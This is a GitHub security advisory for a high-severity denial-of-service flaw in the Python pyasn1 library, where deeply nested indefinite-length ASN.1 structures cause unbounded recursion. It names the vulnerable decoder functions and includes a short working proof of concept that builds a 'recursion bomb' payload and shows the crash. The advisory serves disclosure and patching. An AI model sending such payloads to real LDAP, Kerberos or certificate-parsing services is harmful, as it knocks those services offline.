# [H] Denial of Service in pyasn1 via Unbounded Recursion

## Summary
Severity: High
Advisory: GHSA-jr27-m4p2-rc6r
CVE: CVE-2026-30922
CWE: CWE-674, CWE-835
Ecosystem: PyPI
CVSS: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H (CVSS_V3)
Published: 2026-03-17
Source: https://github.com/advisories/GHSA-jr27-m4p2-rc6r
Type: github-advisory

## Affected
- PyPI: `pyasn1` — affected >=0 <0.6.3

## Details
### Summary
The `pyasn1` library is vulnerable to a Denial of Service (DoS) attack caused by uncontrolled recursion when decoding ASN.1 data with deeply nested structures. An attacker can supply a crafted payload containing nested `SEQUENCE` (`0x30`) or `SET` (`0x31`) tags with Indefinite Length (`0x80`) markers. This forces the decoder to recursively call itself until the Python interpreter crashes with a `RecursionError` or consumes all available memory (OOM), crashing the host application.

### Details
The vulnerability exists because the decoder iterates through the input stream and recursively calls `decodeFun` (the decoding callback) for every nested component found, without tracking or limiting the recursion depth.
Vulnerable Code Locations:
1. `indefLenValueDecoder` (Line 998):
```for component in decodeFun(substrate, asn1Spec, allowEoo=True, **options):```
This method handles indefinite-length constructed types. It sits inside a `while True` loop and recursively calls the decoder for every nested tag.

2. `valueDecoder` (Lines 786 and 907):
```for component in decodeFun(substrate, componentType, **options):```
This method handles standard decoding when a schema is present. It contains two distinct recursive calls that lack depth checks: Line 786: Recursively decodes components of `SEQUENCE` or `SET` types. Line 907: Recursively decodes elements of `SEQUENCE OF` or `SET OF` types.

4. `_decodeComponentsSchemaless` (Line 661):
```for component in decodeFun(substrate, **options):```
This method handles decoding when no schema is provided.

In all three cases, `decodeFun` is invoked without passing a `depth` parameter or checking against a global `MAX_ASN1_NESTING` limit.

### PoC
```
import sys
from pyasn1.codec.ber import decoder

sys.setrecursionlimit(100000)

print("[*] Generating Recursion Bomb Payload...")
depth = 50_000
chunk = b'\x30\x80' 
payload = chunk * depth

print(f"[*] Payload size: {len(payload) / 1024:.2f} KB")
print("[*] Triggering Decoder...")

try:
    decoder.decode(payload)
except RecursionError:
    print("[!] Crashed: Recursion Limit Hit")
except MemoryError:
    print("[!] Crashed: Out of Memory")
except Exception as e:
    print(f"[!] Crashed: {e}")
```

```
[*] Payload size: 9.77 KB
[*] Triggering Decoder...
[!] Crashed: Recursion Limit Hit
```

### Impact
- This is an unhandled runtime exception that typically terminates the worker process or thread handling the request. This allows a remote attacker to trivially kill service workers with a small payload (<100KB), resulting in a Denial of Service. Furthermore, in environments where recursion limits are increased, this leads to server-wide memory exhaustion.
- Service Crash: Any service using `pyasn1` to parse untrusted ASN.1 data (e.g., LDAP, SNMP, Kerberos, X.509 parsers) can be crashed remotely.
- Resource Exhaustion: The attack consumes RAM linearly with the nesting depth. A small payload (<200KB) can consume hundreds of megabytes of RAM or exhaust the stack.

### Credits
Vulnerability discovered by Kevin Tu of TMIR at ByteDance.

## References
- https://github.com/pyasn1/pyasn1/security/advisories/GHSA-jr27-m4p2-rc6r
- https://nvd.nist.gov/vuln/detail/CVE-2026-30922
- https://github.com/pyasn1/pyasn1/commit/5a49bd1fe93b5b866a1210f6bf0a3924f21572c8
- https://github.com/pyasn1/pyasn1/commit/25ad481c19fdb006e20485ef3fc2e5b3eff30ef0
- https://access.redhat.com/errata/RHSA-2026:10184
- https://access.redhat.com/errata/RHSA-2026:22970
- https://access.redhat.com/errata/RHSA-2026:22987
- https://access.redhat.com/errata/RHSA-2026:24761
- https://access.redhat.com/errata/RHSA-2026:24762
- https://access.redhat.com/errata/RHSA-2026:37275
- https://access.redhat.com/errata/RHSA-2026:41928
- https://access.redhat.com/errata/RHSA-2026:6309
- https://access.redhat.com/errata/RHSA-2026:6568
- https://access.redhat.com/errata/RHSA-2026:6720
- https://access.redhat.com/errata/RHSA-2026:6912
- https://access.redhat.com/errata/RHSA-2026:6926
- https://access.redhat.com/errata/RHSA-2026:8437
- https://access.redhat.com/security/cve/CVE-2026-30922
- https://bugzilla.redhat.com/show_bug.cgi?id=2448553
- https://github.com/pyasn1/pyasn1
